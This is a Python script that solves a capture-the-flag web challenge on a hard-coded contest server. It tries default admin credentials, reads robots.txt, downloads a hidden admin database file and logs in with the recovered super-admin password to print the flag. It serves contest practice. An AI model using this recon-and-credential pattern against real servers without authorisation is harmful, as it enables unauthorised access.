from bs4 import BeautifulSoup
import requests
import hashlib
import re

def red(prt):
    return "\033[91m{}\033[00m".format(prt)
def grn(prt):
    return "\033[92m{}\033[00m".format(prt)
def cyn(prt):
    return "\033[96m{}\033[00m".format(prt)
def flag(stuff):
    inner = re.search(r"\{.+\}", stuff).group()
    return  stuff.replace('UDCTF', cyn('UDCTF')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))


url = "http://52.15.140.126:8080/"

'''
print 'inspecting site...'
r = requests.get(url, allow_redirects=True)
soup = BeautifulSoup(r.text, 'lxml')
print soup.prettify()
r.close()
       
print 'presented a login page...'
r = requests.post(url + 'login', data = {'username': 'admin', 'password': 'admin'}, allow_redirects=True)
print r.text
r.close()
print 'that\'s interesting...'

print 'exploring around...'
r = requests.get(url + 'robots.txt', allow_redirects=True)
print r.text
r.close()
print 'that\'s interesting...'

print 'exploring around...'
r = requests.get(url + '1337_admin_Info', allow_redirects=True)
with open('database', 'wb') as f:
    f.write(r.content)
r.close()
print 'yay, got a file...'
'''

print 'now with super_admin and password, will try logging in'
r = requests.post(url + 'login', data = {'username': 'SUp3R_1337_aDmin_Power', 'password': 'aptiva9'}, allow_redirects=True)
print flag(r.text)
r.close()

 
